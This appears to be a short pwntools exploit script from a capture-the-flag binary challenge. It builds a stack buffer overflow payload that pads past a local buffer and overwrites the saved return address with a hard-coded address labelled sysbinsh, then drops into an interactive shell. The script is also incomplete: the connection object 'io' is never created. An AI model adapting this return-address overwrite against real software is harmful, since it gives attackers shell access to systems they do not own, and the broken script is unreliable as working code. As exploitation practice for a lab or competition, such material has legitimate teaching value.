from pwn import *
debug = True
#context.log_level = "debug"
sysbinsh = 0x0804863A


esp_addr = 0xffffd1f0
char_addr = esp_addr + 0x1C
ebp_addr = 0xffffd278
char_num = ebp_addr-char_addr
print char_num
payload = ""
payload += char_num*"a"
payload += "junk"
payload += p32(sysbinsh)
io.sendline(payload)
io.interactive()



